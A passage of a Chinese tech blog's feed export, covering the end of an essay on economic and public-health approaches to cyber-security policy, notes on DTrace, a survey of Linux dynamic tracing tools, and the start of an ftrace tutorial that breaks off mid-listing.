<p>a DDOS attack, and the company might notify other firms to use the same technique. Finally, an industry might agree to establish a uniform set of cyber-security standards, along with monitoring and enforcement mechanisms to ensure that all members are implementing the agreed-upon measures. They might, in other words, form something like a cartel.</p>
<p>例如，面对DDOS 攻击的严重威胁，作者提出行业公司可能会同意建立一套统一的网络安全标准，以及监测和执法机制，确保所有成员都执行商定的措施。类似于一个卡特尔组织。</p>
<p>a partnership among the U.S. Centers for Disease Control and Prevention, the CDC’s state level counterparts, and front line health care providers, such as hospitals, clinics, and individual medical practitioners.</p>
<p>又例如，借鉴公共卫生领域的诸多实践经验：强制接种（mandatory inoculations ）、监测网（Monitor）、隔离（isolation and quarantine ）、机构协作等。与其授权某个单独的监管者检测恶意代码爆发的网络流量，应该给私营企业分派任务，报告他们经历的漏洞和威胁信息，就像医院向公共卫生当局汇报一样。为了激励企业参与分布式检测网络，他们会获得不同的补助（基于网络安全数据是一种市场上供不应求的公共财产理论）以及免责权利（例如反垄断法豁免权）。</p>
<p>再比如：网络入侵的最优水平不为零，网络安全的支出最优水平是无穷的。从经济角度来说，目标是控制攻击数水平，而不是防止所有的攻击。</p>
<p>科斯的经济理论可以说是这篇文章的精魂所在。罗纳德·哈里·科斯（Ronald H Coase）——新制度经济学的鼻祖，美国芝加哥大学教授、芝加哥经济学派代表人物之一，1991年诺贝尔经济学奖的获得者。两篇代表作《企业的性质》和《社会成本问题》之中，科斯首次创造性地通过提出“交易费用”来解释企业存在的原因以及企业扩展的边界问题。</p>
<p>这样的例子还很多，感兴趣的朋友可以阅读原文。</p>
<p>作者NATHAN ALEXANDER，经历非常丰富。学术背景以外，还有美国司法部、国土安全部任职、海外派驻经历，从华盛顿出来之后，又回到学校去教书。可能是这些丰富地经历，造就了他开阔地思路，没有非敌即我的简单思维，有很强的经济学功底，环保法、反托拉斯法、公共卫生法信手拈来，对网络安全领域的参与主体、攻击技术、专业细节的掌握相当内行，和一般的学者不同。这套旋转门的制度设计还是很神奇地。</p>
<p>GEORGE MASON UNIVERSITY SCHOOL OF LAW，Arlington，VA<br>Assistant Professor of Law (January 2008)</p>
<p>DEPARTMENT OF HOMELAND SECURITY<br>Deputy Assistant Secretary for Policy Development(2006-2007)</p>
<p>GEORGETOWN UNIVERSITY LAW CENTER，Washington，DC<br>DUKE UNIVERSITY SCHOOL OF LAW，Durham，NC</p>
<h2 id="组织视角"><a href="#组织视角" class="headerlink" title="组织视角"></a>组织视角</h2><h4 id="香港警务处网络安全与科技罪案调查科"><a href="#香港警务处网络安全与科技罪案调查科" class="headerlink" title="香港警务处网络安全与科技罪案调查科"></a><a href="https://riboseyim.github.io/2017/04/09/CyberSecurity-CSTCB/">香港警务处网络安全与科技罪案调查科</a></h4><p>网络安全和科技罪案调查科（Cyber Security and Technology Crime Bureau，缩写：CSTCB，简称科罪组）隶属于香港警务处刑事及保安处刑事部，主要责任为搜集及分析情报、调查严重科技罪案、作出法律及技术性研究，并且与业内专业人士和海外执法机关联络，防止科技罪案发生；与此同时，24小时监察香港（自愿登记参与）的主要电脑系统的网络数据流量变化，防范针对上述系统的网络攻击等科技罪行，确保网络安全。<br><a href="https://riboseyim.github.io/2017/04/09/CyberSecurity-CSTCB/">more details &gt;&gt;&gt;&gt; </a></p>
<h2 id="经济视角"><a href="#经济视角" class="headerlink" title="经济视角"></a>经济视角</h2><ul>
<li><a href="https://riboseyim.github.io/2017/05/09/CyberSecurity-Hacker/">Cyber-Security: 黑客与技术、产业及其精神世界</a></li>
<li><a href="http://www.jianshu.com/p/670c4d2bb419">Cyber-Security: 事与愿违的后门程序 | Economist</a></li>
</ul>
<h4 id="实现安全性的目标必须强调可操作性"><a href="#实现安全性的目标必须强调可操作性" class="headerlink" title="实现安全性的目标必须强调可操作性"></a>实现安全性的目标必须强调可操作性</h4><blockquote>
<p>所有安全系统最终依赖于用户对安全重要性的认识，以及对其必然带来的限制的接受。安全取决于人：取决于系统用户对规则的遵守，取决于分析人员和监控人员在规则被破坏时能够发现。…… 糟糕的安全策略会导致用户不断地躲避检测，以便完成其工作，或者使用户不停地发脾气，这只会给你的防御人员带来额外的负担。——  Michael Collins《Network Security Through Data Analysis》</p>
</blockquote>
<h2 id="技术视角"><a href="#技术视角" class="headerlink" title="技术视角"></a>技术视角</h2><ul>
<li><a href="https://riboseyim.github.io/2017/11/12/DevOps-Container-Security/">Cyber-Security: Linux 容器安全的十重境界</a></li>
<li><a href="https://riboseyim.github.io/2017/10/29/CyberSecurity-WiFi/">Cyber-Security: 警惕 Wi-Fi 漏洞</a></li>
<li><a href="https://riboseyim.github.io/2017/08/31/CyberSecurity-Headers/">Cyber-Security: Web应用安全：攻击、防护和检测</a></li>
<li><a href="https://riboseyim.github.io/2017/08/09/Protocol-IPv6/">Cyber-Security: IPv6 &amp; Security</a></li>
<li><a href="https://riboseyim.github.io/2016/10/06/CyberSecurity-SSH/">Cyber-Security: OpenSSH 并不安全</a></li>
<li><a href="https://riboseyim.github.io/2016/06/12/CyberSecurity-Trojan/">Cyber-Security: Linux/XOR.DDoS 木马样本分析</a></li>
<li><a href="https://riboseyim.github.io/2017/07/14/Network-sFlow/">浅谈基于数据分析的网络态势感知</a></li>
<li><a href="https://riboseyim.github.io/2017/06/16/Network-Pcap/">Packet Capturing:关于网络数据包的捕获、过滤和分析</a></li>
<li><a href="https://riboseyim.github.io/2016/04/26/Network-Ntopng/">新一代Ntopng网络流量监控—可视化和架构分析</a></li>
</ul>
<h4 id="扩展阅读-《The-Cyber-Security-Master》"><a href="#扩展阅读-《The-Cyber-Security-Master》" class="headerlink" title="扩展阅读:《The Cyber-Security Master》"></a>扩展阅读:<a href="https://www.gitbook.com/book/riboseyim/cyber-security-manual">《The Cyber-Security Master》</a></h4><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://www.siemens.com/customer-magazine/en/home/industry/process-industry/facing-a-real-threat-head-on.html">How do you keep your DCS safe from CyberAttacks? </a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzI5NjA0NjI5MQ==&amp;mid=401259700&amp;idx=1&amp;sn=65d2ee6f02d53efbf2c7e1ac15d3a30f&amp;scene=1&amp;srcid=1231RPRoQ03FRhZshsODUTYG%23rd">安全情报分析中的钻石模型 | 2015-12-14 安全威胁情报</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzI5NjA0NjI5MQ==&amp;mid=402228103&amp;idx=1&amp;sn=c6f5cb19d1da6477317948b2ea6b5cfe&amp;scene=1&amp;srcid=0313gc3RNbJZ8IIMvAAGXLTl%23rd">乌克兰电网攻击第二季 | 2016-01-31 安全威胁情报</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&amp;mid=2651062903&amp;idx=2&amp;sn=22909a1347a666ad7deecac7165145c1&amp;chksm=bd1f90fc8a6819eaecf542ce013c9cf8d63c2b13a795cf6d7c3766208dc0e19b66c0966e2788&amp;mpshare=1&amp;scene=1&amp;srcid=0220kx3TyagsrKfD9jCvl5w1%23rd">加油站也会被黑？来看看这个攻击案例|2017-02-19 clouds FreeBuf</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MTA2MTMwNjYwMQ==&amp;mid=203548863&amp;idx=3&amp;sn=1a0c1eae997d7e321a5dc179c99f948a&amp;scene=0%23rd">360副总裁谭晓生谈安全：万物互联时代，要玩儿“塔防游戏”，不是“工程游戏 ”|BT500人峰会</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5ODQ2MDIyMA==&amp;mid=402006332&amp;idx=1&amp;sn=e47215745825a8bc223ab263db4ae822&amp;scene=1&amp;srcid=0127TcRfvGwbqCgfKQTzFxKH#rd">池建强&amp;双乐：DDoS，网络安全世界里的暗黑杀手</a></li>
<li><a href="http://jaseywang.me/2017/03/04/%e5%85%a8%e7%bd%91%e7%bb%9f%e4%b8%80%e8%b4%a6%e6%88%b7%e5%ae%9e%e8%b7%b5/">全网统一账户实践(OpenLDAP) |jaseywang.me </a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Policy&amp;Law</tag>
        <tag>架构师</tag>
        <tag>Cyber-Security</tag>
      </tags>
  </entry>
  <entry>
    <title>DTrace-Ops</title>
    <url>/2018/11/30/DTrace-Ops/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<h1 id="DTrace"><a href="#DTrace" class="headerlink" title="DTrace"></a>DTrace</h1><h2 id="4-3-1-静态和动态跟踪"><a href="#4-3-1-静态和动态跟踪" class="headerlink" title="4.3.1 静态和动态跟踪"></a>4.3.1 静态和动态跟踪</h2><h2 id="4-3-2-探针"><a href="#4-3-2-探针" class="headerlink" title="4.3.2 探针"></a>4.3.2 探针</h2><p><strong>四元组</strong></p>
<blockquote>
<p>provider:module:function:name</p>
</blockquote>
<p>provider:一些相关探针的集合，类似软件库的概念<br>module&amp;function:动态产生，标记探针指示的代码位置。<br>name:探针的名字</p>
<h2 id="4-3-3-provider"><a href="#4-3-3-provider" class="headerlink" title="4.3.3 provider"></a>4.3.3 provider</h2><p>可用的DTrace provider 取决于你的DTrace和操作系统版本。例如：</p>
<p>syscall:系统调用自陷表<br>vminfo:虚拟内存统计<br>sysinfo:系统统计<br>profile:任意频率的采样<br>sched:内核调度事件<br>proc:进程级别事件，创建、执行、退出<br>io:磁盘<br>pid:用户级别动态追踪<br>tcp:TCP协议事件，连接、发送和接收。<br>ip:IP协议事件、发送和接收<br>fbt:内核级别动态追踪</p>
<h2 id="4-3-4-参数"><a href="#4-3-4-参数" class="headerlink" title="4.3.4 参数"></a>4.3.4 参数</h2><p>  入口：<br>  返回：</p>
<h2 id="4-3-5-D语言"><a href="#4-3-5-D语言" class="headerlink" title="4.3.5 D语言"></a>4.3.5 D语言</h2><p>  D语言和awk类似<br>  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">probe_description /predicate/ ( action )</span><br></pre></td></tr></table></figure></p>
<p>  action是一系列以分号分隔的语句，当探针触发时执行。<br>  predicate是可选的过滤表达式</p>
<h2 id="4-3-6-内置变量"><a href="#4-3-6-内置变量" class="headerlink" title="4.3.6 内置变量"></a>4.3.6 内置变量</h2><h2 id="4-3-7-action"><a href="#4-3-7-action" class="headerlink" title="4.3.7 action"></a>4.3.7 action</h2><h2 id="4-3-8-变量类型"><a href="#4-3-8-变量类型" class="headerlink" title="4.3.8 变量类型"></a>4.3.8 变量类型</h2><h2 id="4-3-9-单行命令"><a href="#4-3-9-单行命令" class="headerlink" title="4.3.9 单行命令"></a>4.3.9 单行命令</h2><h2 id="4-3-10-脚本"><a href="#4-3-10-脚本" class="headerlink" title="4.3.10 脚本"></a>4.3.10 脚本</h2><h2 id="4-3-11-开销"><a href="#4-3-11-开销" class="headerlink" title="4.3.11 开销"></a>4.3.11 开销</h2><h2 id="4-3-12-文档和资源"><a href="#4-3-12-文档和资源" class="headerlink" title="4.3.12 文档和资源"></a>4.3.12 文档和资源</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2>]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DTrace</tag>
      </tags>
  </entry>
  <entry>
    <title>专题：动态追踪技术</title>
    <url>/2016/11/26/DTrace/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>动态追踪技术：DTrace for Linux</li>
<li>Linux 追踪器选型</li>
</ul>
<blockquote>
<p>应用软件运行速度提升的关键在于有一个好的性能分析器(profiler)帮助指导程序开发。《黑客与画家》（Hackers &amp; Painters）</p>
</blockquote>
<span id="more"></span>
<h2 id="Introduction-to-DTrace"><a href="#Introduction-to-DTrace" class="headerlink" title="Introduction to DTrace"></a>Introduction to DTrace</h2><h4 id="What-is-DTrace"><a href="#What-is-DTrace" class="headerlink" title="What is DTrace"></a>What is DTrace</h4><p>通过前面几篇文章的介绍，我们已经可以通过一系列命令，从不同维度获得操作系统当前的性能运行情况。另外，借助类似 <a href="https://riboseyim.github.io/2016/11/04/OpenSource-Ganglia/">Ganglia</a> 这样的开源产品，持续不断地实施性能数据采集和存储，我们基于时间序列的历史性能图形，就可以大致判读出计算集群的资源消耗情况和变化趋势。但是，仅仅这些还是不够的，在很多情况下，我们希望能够知道：“慢，是为什么慢；快，又是为什么快”。如果要回答这个问题，就必须引入另外一件神兵利器：<strong>动态追踪技术（Dynamic Tracing）</strong>。</p>
<p>鉴于这套兵器过于复杂（牛逼），属于专家级技能， advanced performance analysis and troubleshooting tool。据称掌握该技能需要耗费大约100小时以上，所以如果不是对于系统性能问题有极致追求，以及变态般地技术狂热，建议绕过本文。为了便于展开，今天先起个头，重点梳理下动态追踪技术的发展简史和目前的生态环境。更加具体详细的内容，会在后续的文章中陆续发表。</p>
<p>严格来说，DTrace这个词本身，已经并不是狭义上基于 Solaris 的那套工具了，而是代表的是后现代操作系统的一整套工具家族和方法论。</p>
<h4 id="History-of-DTrace"><a href="#History-of-DTrace" class="headerlink" title="History of DTrace"></a>History of DTrace</h4><blockquote>
<p>当时 Solaris 操作系统的几个工程师花了几天几夜去排查一个看似非常诡异的线上问题。<br>开始他们以为是很高级的问题，就特别卖力，结果折腾了几天，最后发现其实是一个非常愚蠢的、某个不起眼的地方的配置问题。<br>自从那件事情之后，这些工程师就痛定思痛，创造了 DTrace 这样一个非常高级的调试工具，来帮助他们在未来的工作当中避免把过多精力花费在愚蠢问题上面。<br>毕竟大部分所谓的“诡异问题”其实都是低级问题，属于那种“调不出来很郁闷，调出来了更郁闷”的类型。—-《漫谈动态追踪技术》</p>
</blockquote>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DTrace_History_01.png" alt=""></p>
<p>通观DTrace的演变过程，几乎相当于一部现代操作系统系统的发展史，细查起来，极其复杂。但是有两个人非常值得关注，一个是国际级的布道师，一个是国内的代表人物，初学者完全可以通过阅读他们的文章、代码，甚至微博／Twitter动态，了解动态追踪技术的实际应用情况。</p>
<p><strong>Brendan Gregg</strong><br>前SUN性能工程师，最早的DTrace用户，出版了包括《性能之巅》在内的一大批书籍，囊括了性能问题领域的技术、工具、方法论等方方面面。他是动态追踪技术当之无愧的首席布道师，维护的个人博客发布了大量的原创内容，并且持续保持着相当的活跃度。可以作为第一手的学习资料。</p>
<p><a href="https://twitter.com/brendangregg">Twitter：</a><br><a href="http://www.brendangregg.com">个人网站：</a></p>
<p><strong>章亦春</strong><br>网名 agentzh。开源项目OpenResty创始人，编写了很多 Nginx 的第三方模块， Perl 开源模块，以及最近一些年写的很多 Lua 方面的库。他发表过的<a href="https://openresty.org/posts/dynamic-tracing">《漫谈动态追踪技术》</a>，是目前唯一由Brendan认证的中文资料，入门首选。另外，他本人也在目前的工作、开源项目运营中大量使用动态追踪技术。<br><a href="http://weibo.com/agentzh">微博：</a></p>
<h4 id="Linux-追踪器选型"><a href="#Linux-追踪器选型" class="headerlink" title="Linux 追踪器选型"></a>Linux 追踪器选型</h4><p>动态追踪技术最复杂的地方在于追踪器种类繁多，让人一时无从下手。根据前人的一些经验总结，建议按照以下路径进行选择：</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DTrace_Linux_Choose.png" alt=""></p>
<h4 id="普通模式"><a href="#普通模式" class="headerlink" title="普通模式"></a>普通模式</h4><p>适用于：开发者, 系统管理员, DevOps, SRE</p>
<p><strong>CPU分析</strong></p>
<p>perf_events的应用很广泛，配合Brendan Gregg老师研究的火焰图工具，可以分析程序在所有代码基的资源消耗，精确定位到函数级。例如：<br><img src="http://riboseyim-qiniu.riboseyim.com/DTrace_Flame_Java_01.png" alt="火焰图实例"></p>
<p><strong>进程追踪</strong><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ./execsnoop</span><br><span class="line">Tracing exec()s. Ctrl-C to end.</span><br><span class="line">   PID   PPID ARGS</span><br><span class="line"> 22898  22004 man ls</span><br><span class="line"> 22905  22898 preconv -e UTF-8</span><br><span class="line"> 22908  22898 pager -s</span><br><span class="line"> 22907  22898 nroff -mandoc -rLL=164n -rLT=164n -Tutf8</span><br></pre></td></tr></table></figure></p>
<h4 id="HARD模式"><a href="#HARD模式" class="headerlink" title="HARD模式"></a>HARD模式</h4><p>适用于：性能或内核工程师</p>
<blockquote>
<p>Understanding all the Linux tracers to make a rational decision between them a huge undertaking.</p>
</blockquote>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DTrace_Linux_Types.png" alt=""></p>
<p>0、dtrace</p>
<ul>
<li>案例：<a href="https://ipfans.github.io/2016/09/tracing-python-program-with-dtrace/">ipfans:使用dtrace跟踪Python应用</a></li>
</ul>
<p>1、ftrace<br>内核hacker的最爱。已经包含在内核，能够支持 tracepoints, kprobes, and uprobes,<br>并提供一些能力: 事件追踪, 可选择过滤器和参数; 事件计数和时间采样，内核概览；基于函数的路径追踪。</p>
<ul>
<li><a href="https://riboseyim.github.io/2017/04/17/DTrace_FTrace/">动态追踪技术（三）：Tracing your kernel Functions! | @RiboseYim</a></li>
</ul>
<p>2、perf_events<br>Linux用户的主要追踪器之一，它的源代码在内核中，通常在一个 linux-tools-common包。</p>
<p>3、eBPF<br>基于内核的虚拟机</p>
<ul>
<li><a href="https://riboseyim.github.io/2017/06/27/DTrace_bcc/">动态追踪技术（四）：基于 Linux bcc/BPF 实现 Go 程序动态追踪</a></li>
</ul>
<p>4、 SystemTap<br>最强有力的追踪器。它可以做几乎所有的事情: 分析，打点, kprobes, uprobes (源子 SystemTap), USDT, 内核编程等。</p>
<p>5、LTTng<br>事件收集器, 优于其它追踪器，支持多种事件类型，包括 USDT。<br><a href="http://lttng.org/docs/v2.9/#doc-lttng-relayd">The LTTng Documentation v2.9</a></p>
<ul>
<li><a href="http://blogs.microsoft.co.il/sasha/2017/03/30/tracing-runtime-events-in-net-core-on-linux/">Sasha Goldshtein:Tracing Runtime Events in .NET Core on Linux</a></li>
</ul>
<p>6、ktap<br>一个很有前景的追踪器，基于lua内核虚拟机</p>
<p>7、dtrace4linux<br>个人开发者业余产出 (Paul Fox) ，将 Sun DTrace迁移到 Linux。</p>
<p>8、OL DTrace<br>Oracle Linux DTrace，将 DTrace 迁移到Oracle Linux的实现。</p>
<p>9、sysdig<br>一种新型追踪器， 能够基于类似tcpdump的命令操作 syscall events, 再用lua后处理。</p>
<p>10、strace + gdb</p>
<ul>
<li><a href="http://man7.org/linux/man-pages/man1/strace.1.html">strace - trace system calls and signals</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5MTY1MjQ3Nw==&amp;mid=2651939588&amp;idx=1&amp;sn=35f71c5f88d1edf23cb2efc812ab8e6c&amp;chksm=bd578c168a20050041c08618281691f0111f61c789097a69095933057618637fc54817815921#rd">动态追踪技术（二）：strace+gdb 溯源 Nginx 内存溢出异常 </a></li>
<li><a href="https://riboseyim.github.io/2017/06/27/DTrace_bcc/">动态追踪技术（四）：基于 Linux bcc/BPF 实现 Go 程序动态追踪</a></li>
<li><a href="https://github.com/golang/go/issues/25471#issuecomment-391906366">time: Sleep requires ~7 syscalls</a></li>
</ul>
<h4 id="火焰图应用案例"><a href="#火焰图应用案例" class="headerlink" title="火焰图应用案例"></a>火焰图应用案例</h4><ul>
<li><a href="http://www.ruanyifeng.com/blog/2017/09/flame-graph.html">阮一峰:如何读懂火焰图？</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzAwMDU1MTE1OQ==&amp;mid=2653548763&amp;idx=1&amp;sn=b88c482a96ad691a2f5b2c01b934ab17&amp;chksm=813a6143b64de8559715fad5e0abece43b64fb1681bfd3f3160ca7ca17c89495cbf64209d026&amp;scene=0&amp;key=d6331003961a2cc469dae6df3bf594604336519731be677350b47d6d9f4909f28d60518b9d1dba75db7af70e0d22b5147382e33be51c54e4d92940bb73afa67b781daf1338e7471339cce5fabc8ba1d2&amp;ascene=0&amp;uin=Mjg2OTA0MDQ4Mg%3D%3D">Thayne McCombs:如何使用火焰图来降低服务器负载</a></li>
<li><a href="http://brendanjryan.com/golang/profiling/2018/02/28/profiling-go-applications.html">PROFILING GO APPLICATIONS WITH FLAMEGRAPHS| February 28, 2018</a></li>
<li><a href="https://github.com/mapbox/flamebearer">A blazing fast flame graph tool for Node and V8. Used to visualize and explore performance profiling results</a></li>
<li><a href="https://medium.com/dm03514-tech-blog/sre-performance-analysis-tuning-methodology-using-a-simple-http-webserver-in-go-d475460f27ca">SRE: Performance Analysis: Tuning Methodology Using a Simple HTTP Webserver In Go |  go tool pprof</a></li>
</ul>
<h2 id="勘误"><a href="#勘误" class="headerlink" title="勘误"></a>勘误</h2><ul>
<li>No.001 初稿已删除【大家比较熟知的netfilter，就是基于BPF实现的动态编译器】<br>本来是想表达 iptables 对 bpf 的支持。</li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="动态追踪技术"><a href="#动态追踪技术" class="headerlink" title="动态追踪技术"></a>动态追踪技术</h4><ul>
<li><a href="https://riboseyim.github.io/2016/11/26/DTrace/">动态追踪技术(一)：DTrace 导论</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5MTY1MjQ3Nw==&amp;mid=2651939588&amp;idx=1&amp;sn=35f71c5f88d1edf23cb2efc812ab8e6c&amp;chksm=bd578c168a20050041c08618281691f0111f61c789097a69095933057618637fc54817815921#rd">动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 </a></li>
<li><a href="https://riboseyim.github.io/2017/04/17/DTrace_FTrace/">动态追踪技术(三)：Tracing Your Kernel Function!</a></li>
<li><a href="https://riboseyim.github.io/2017/06/27/DTrace_bcc/">动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪</a></li>
<li><a href="https://riboseyim.github.io/2018/02/16/DTrace-Linux/">动态追踪技术(五)：Welcome DTrace for Linux</a></li>
</ul>
<h4 id="《Linux-Perf-Master》"><a href="#《Linux-Perf-Master》" class="headerlink" title="《Linux Perf Master》"></a>《Linux Perf Master》</h4><ul>
<li><a href="https://riboseyim.gitbook.io/perf">https://riboseyim.gitbook.io/perf</a></li>
<li><a href="https://www.gitbook.com/book/riboseyim/linux-perf-master/details">https://www.gitbook.com/book/riboseyim/linux-perf-master/details</a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/banner-LPM-201803.png" alt=""></p>
<h4 id="How-Linux-Works"><a href="#How-Linux-Works" class="headerlink" title="How Linux Works"></a>How Linux Works</h4><ul>
<li><a href="https://riboseyim.github.io/2017/12/11/Linux-Perf-Load/">Linux 性能诊断:负载评估</a></li>
<li><a href="https://riboseyim.github.io/2017/12/11/Linux-Perf-Netflix/">Linux 性能诊断:快速检查单</a></li>
<li><a href="https://riboseyim.github.io/2017/05/29/Linux-Works/">操作系统原理 | How Linux Works（一）：How the Linux Kernel Boots</a></li>
<li><a href="https://riboseyim.github.io/2017/05/29/Linux-Works/">操作系统原理 | How Linux Works（二）：User Space &amp; RAM</a></li>
<li><a href="https://riboseyim.github.io/2017/12/11/Linux-Works-Memory/">操作系统原理 | How Linux Works（三）：内存管理</a></li>
<li><a href="https://riboseyim.github.io/2018/01/08/Linux-Works-Network/">操作系统原理 | How Linux Works（三）：网络管理</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://openresty.org/posts/dynamic-tracing/">动态追踪技术漫谈 | 章亦春</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5ODQ2MDIyMA==&amp;mid=2650712266&amp;idx=1&amp;sn=54d909d240eb701ae48467dc798ddc7f&amp;scene=1&amp;srcid=0506Cd7v9OLvaEFRKBTD2ARy%23rd">动态追踪技术（中） - Dtrace、SystemTap、火焰图 | 原创 2016-05-06 章亦春 MacTalk</a></li>
<li><a href="https://mp.weixin.qq.com/s/4Y77jUqfgKeBS2hnitrUrg">动态追踪技术-应用性能瓶颈排障利器之火焰图 | 2016-12-01 郑晓川 江凌生 TIGCHAT</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzA4Nzg5Nzc5OA==&amp;mid=2651659767&amp;idx=1&amp;sn=3c515cb32bcbcafe16c749024d1545ef&amp;scene=1&amp;srcid=0524lBh8JTWhnUmtv72PiQSN%23rd">运维利器：万能的 strace | 2016-05-24 王子勇 高效运维</a></li>
<li><a href="https://jvns.ca/blog/2017/07/05/linux-tracing-systems/">(推荐)Linux tracing systems &amp; how they fit together | Julia Evans </a></li>
<li><a href="http://www.brendangregg.com/blog/2016-12-27/linux-tracing-in-15-minutes.html">Give me 15 minutes and I’ll change your view of Linux tracing | Brendan Gregg’s Blog </a></li>
<li><a href="http://www.brendangregg.com/blog/2017-02-05/file-system-flame-graph.html">Where has my disk space gone? Flame graphs for file systems | Brendan Gregg’s Blog</a></li>
<li><a href="http://www.brendangregg.com/blog/2017-05-15/container-performance-analysis-dockercon-2017.html">Container Performance Analysis at DockerCon 2017 | Brendan Gregg’s Blog</a></li>
<li><a href="https://jvns.ca/blog/2017/07/05/linux-tracing-systems/">(推荐) Julia Evans: Linux tracing systems &amp; how they fit together</a></li>
<li><a href="https://ipfans.github.io/2016/09/tracing-python-program-with-dtrace/">使用 dtrace 跟踪 Python 应用 | ipfans’s Blog</a></li>
<li><a href="http://blogs.microsoft.co.il/sasha/2016/03/31/probing-the-jvm-with-bpfbcc/">Probing the JVM with BPF/BCC | Sasha Goldshtein</a></li>
<li><a href="http://www.infoq.com/cn/news/2017/07/eBay-shopping-i-o?utm_campaign=infoq_content&amp;utm_source=infoq&amp;utm_medium=feed&amp;utm_term=global">从eBay购物车丢失看处理网络I/O </a></li>
<li><a href="https://blog.twitch.tv/gos-march-to-low-latency-gc-a6fa96f06eb7">Go’s march to low-latency GC</a></li>
<li><a href="http://blogs.microsoft.co.il/sasha/2017/03/30/tracing-runtime-events-in-net-core-on-linux/">Tracing Runtime Events in .NET Core on Linux | March 30, 2017</a></li>
<li><a href="https://mp.weixin.qq.com/s/3UXBEUmI3dMy9DJHs5gsRg">案例分享：巧用各种工具提升无源码系统的性能和稳定性 | 原创： 杨振 董建  高可用架构  1月17日</a></li>
<li><a href="https://www.sigops.org/s/conferences/sosp/2015/current/2015-Monterey/printable/090-curtsinger.pdf">COZ: Finding Code that Counts with Causal Profiling</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>DTrace</tag>
      </tags>
  </entry>
  <entry>
    <title>动态追踪技术(三) ：Tracing your kernel Functions!</title>
    <url>/2017/04/17/DTrace_FTrace/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>Ftrace 是一个设计用来帮助开发者和设计者监视内核的追踪器，可用于调试或分析延迟以及性能问题。ftrace 令人印象最深刻的是作为一个 function tracer，内核函数调用、耗时等情况一览无余。另外，ftrace 最常见的用途是事件追踪，通过内核是成百上千的静态事件点，看到系统内核的哪些部分在运行。实际上，ftrace 更是一个追踪框架，它具备丰富工具集：延迟跟踪检查、何时发生中断、任务的启用、禁用及抢占等。在 ftrace 的基线版本之上，还有很多第三方提供的开源工具，用于简化操作或者提供数据可视化等扩展应用。</p>
<span id="more"></span>
<h2 id="一、Introduction"><a href="#一、Introduction" class="headerlink" title="一、Introduction"></a>一、Introduction</h2><p>Developer(s):    Steven Rostedt(RedHat) and others<br>Initial release: October 9, 2008;<br>Operating system:    Linux （merged into the Linux kernel mainline in kernel version 2.6.27）<br>Type:    Kernel extension<br>License: GNU GPL<br>Website: <a href="www.kernel.org/doc/Documentation/trace">www.kernel.org/doc/Documentation/trace</a></p>
<h2 id="二、ABC"><a href="#二、ABC" class="headerlink" title="二、ABC"></a>二、ABC</h2><p>在使用ftrace之前，需要确认调试目录是否已经挂载，默认目录：<strong>/sys/kernel/debug/</strong> 。</p>
<p>debugfs是Linux内核中一种特殊的文件系统，非常易用、基于RAM，专门设计用于调试。（since version 2.6.10-rc3，<a href="https://en.wikipedia.org/wiki/Debugfs)。">https://en.wikipedia.org/wiki/Debugfs)。</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">或者指定到自己的目录</span><br><span class="line">mkdir /debug</span><br><span class="line">mount -t debugfs nodev /debug</span><br></pre></td></tr></table></figure>
<p>挂载之后会自动创建如下文件：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/sys/kernel/debug<span class="comment"># ls -lrt</span></span><br><span class="line">drwxr-xr-x.  2 root root 0 12月 28 17:24 x86</span><br><span class="line">drwxr-xr-x.  3 root root 0 12月 28 17:24 boot_params</span><br><span class="line">drwxr-xr-x. 34 root root 0 12月 28 17:24 bdi</span><br><span class="line">-r--r--r--.  1 root root 0 12月 28 17:24 gpio</span><br><span class="line">drwxr-xr-x.  3 root root 0 12月 28 17:24 usb</span><br><span class="line">drwxr-xr-x.  4 root root 0 12月 28 17:24 xen</span><br><span class="line">drwxr-xr-x.  6 root root 0 12月 28 17:24 tracing</span><br><span class="line">drwxr-xr-x.  2 root root 0 12月 28 17:24 extfrag</span><br><span class="line">drwxr-xr-x.  2 root root 0 12月 28 17:24 dynamic_debug</span><br><span class="line">drwxr-xr-x.  2 root root 0 12月 28 17:24 hid</span><br><span class="line">-rw-r--r--.  1 root root 0 12月 28 17:24 sched_features</span><br><span class="line">drwxr-xr-x.  2 root root 0 12月 28 17:24 mce</span><br><span class="line">drwxr-xr-x.  2 root root 0 12月 28 17:24 